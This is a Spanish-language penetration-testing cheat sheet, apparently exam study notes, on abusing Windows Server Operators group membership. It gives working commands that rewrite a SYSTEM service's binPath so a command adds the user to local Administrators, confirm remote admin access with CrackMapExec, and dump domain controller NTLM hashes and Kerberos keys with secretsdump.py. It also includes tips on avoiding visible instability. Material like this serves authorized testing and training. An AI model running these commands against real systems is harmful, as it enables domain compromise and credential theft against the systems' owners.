---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- El grupo **Server Operators** permite administrar servidores Windows (incluyendo Domain Controllers) sin necesidad de ser Domain Admin.
- La membresía en este grupo otorga **SeBackupPrivilege**, **SeRestorePrivilege** y control sobre **servicios locales**.
- Por defecto, **BUILTIN\Server Operators** suele tener **SERVICE_ALL_ACCESS** sobre servicios del sistema (incluso servicios que corren como SYSTEM), lo que permite modificar el `binPath` de un servicio para ejecutar comandos arbitrarios como SYSTEM.
- No es necesario que el servicio arranque correctamente: basta con que el intento de inicio dispare la ejecución del comando inyectado en el `BINARY_PATH_NAME`.

## Herramientas Clave

- **sc.exe**: utilidad nativa de Windows para consultar (`qc`) y modificar (`config`) la configuración de servicios.
- **PsService.exe** (Sysinternals): permite ver permisos (ACL) detallados de un servicio (`security`), algo que `sc.exe` no muestra directamente.
- **net localgroup**: para enumerar y verificar membresía del grupo de administradores locales.
- **CrackMapExec (cme)**: para validar credenciales y comprobar acceso administrativo remoto (Pwn3d!).
- **secretsdump.py (Impacket)**: para volcar credenciales del DC vía DRSUAPI (NTDS.dit) una vez se tiene acceso admin.

## Metodología Paso a Paso

### 1. Enumeración de privilegios y grupo
Confirmar que el usuario actual pertenece a `Server Operators` (vía `whoami /groups` o similar) y que NO está ya en `Administrators` local.

### 2. Identificar un servicio "seguro" para abusar
Elegir un servicio que corra como SYSTEM y cuyo fallo al iniciar no afecte la estabilidad del sistema (ej. servicios `DEMAND_START`, no críticos). Confirmar con `sc qc` que `SERVICE_START_NAME` es `LocalSystem`.

### 3. Verificar permisos sobre el servicio
Usar `PsService.exe security <SERVICE_NAME>` para confirmar que `BUILTIN\Server Operators` tiene `All` (SERVICE_ALL_ACCESS). Esto es el requisito indispensable para poder modificar el binPath.

### 4. Modificar el binPath del servicio
Cambiar el `binPath` para que ejecute un comando que añada al usuario actual al grupo de administradores locales.

### 5. Intentar iniciar el servicio
Ejecutar `sc start` sobre el servicio. Es **esperado que falle** (error 1053), pero el comando inyectado ya se ejecutó durante el intento de arranque.

### 6. Confirmar escalada
Verificar membresía en `Administrators` local con `net localgroup Administrators`.

### 7. Post-explotación
Validar acceso admin remoto con CrackMapExec y, si el host comprometido es un DC, volcar credenciales del NTDS.dit con `secretsdump.py` para obtener hashes NTLM y claves Kerberos de cuentas de dominio (ej. Administrator).

## Cheat Sheet de Comandos

```cmd
:: Consultar configuracion de un servicio (confirmar que corre como SYSTEM)
:: qc = query config
sc qc <SERVICE_NAME>
```

```cmd
:: Ver permisos/ACL detallados del servicio usando PsService (Sysinternals)
:: "security" muestra la ACL completa del servicio
c:\Tools\PsService.exe security <SERVICE_NAME>
```

```cmd
:: Enumerar miembros actuales del grupo de administradores locales
:: util para confirmar el estado ANTES y DESPUES del ataque
net localgroup Administrators
```

```cmd
:: Modificar el binPath del servicio para inyectar un comando
:: binPath= "cmd /c <comando>" -> el espacio despues del = es OBLIGATORIO
:: Aqui el comando añade <USER> al grupo local Administrators
sc config <SERVICE_NAME> binPath= "cmd /c net localgroup Administrators <USER> /add"
```

```cmd
:: Intentar iniciar el servicio para disparar la ejecucion del binPath modificado
:: Es NORMAL que falle (error 1053), el comando ya se ejecuto
sc start <SERVICE_NAME>
```

```cmd
:: Confirmar que el usuario fue agregado exitosamente al grupo de administradores locales
net localgroup Administrators
```

```bash
# Validar credenciales obtenidas y confirmar acceso admin remoto via SMB
# -u usuario / -p contraseña
crackmapexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>'
```

```bash
# Volcar credenciales del Domain Controller via DRSUAPI (NTDS.dit)
# -just-dc-user limita el dump a una cuenta especifica (reduce ruido)
secretsdump.py <USER>@<TARGET_IP> -just-dc-user <TARGET_USER>
```

## "Gotchas" y Troubleshooting

- El fallo del `sc start` con **error 1053** ("The service did not respond to the start or control request in a timely fashion") es **esperado y no indica fallo del ataque**: el comando inyectado en el binPath ya se ejecutó durante el intento de inicio, aunque el servicio en sí no llegue a iniciar correctamente como tal.
- Antes de modificar nada, verifica con `PsService.exe security <SERVICE_NAME>` que el grupo (`Server Operators` u otro grupo del que seas miembro) tenga realmente `All` / `SERVICE_ALL_ACCESS`. `sc.exe` por sí solo no muestra esta ACL de forma legible.
- Elige servicios que sean `DEMAND_START` y no críticos para minimizar el riesgo de causar inestabilidad o un crash visible en el sistema objetivo.
- El espacio después del `=` en `binPath= "..."` en `sc config` es obligatorio; si se omite, el comando falla silenciosamente o da error de sintaxis.
- Una vez logrado el acceso admin local (especialmente si el host es un Domain Controller), esto equivale a compromiso total del dominio: se puede extraer la base NTDS.dit completa y obtener hashes/claves Kerberos de todas las cuentas de dominio.
- Recuerda revertir el `binPath` original del servicio tras la explotación si la metodología/reporting lo requiere (buena práctica, aunque no siempre se exige en examen).